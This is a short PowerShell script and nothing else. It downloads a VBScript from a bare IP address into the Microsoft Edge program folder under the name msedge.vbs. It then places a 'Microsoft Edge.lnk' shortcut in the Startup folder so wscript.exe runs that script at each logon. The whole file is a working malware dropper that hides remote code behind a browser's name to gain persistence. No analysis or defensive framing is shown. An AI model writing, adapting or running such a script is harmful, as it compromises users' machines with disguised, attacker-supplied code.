$wsshell = New-Object -ComObject WScript.shell

$shortcutPath = [System.IO.Path]::Combine([Environment]::GetFolderPath('Startup'), 'Microsoft Edge.lnk')

$shortcut = $wsshell.CreateShortcut($shortcutPath)

Invoke-WebRequest -Uri "http://54.209.180.198:8080/vbscript.vbs" -OutFile "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.vbs"

$shortcut.TargetPath = "wscript.exe"
$shortcut.Arguments = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.vbs"

$shortcut.save()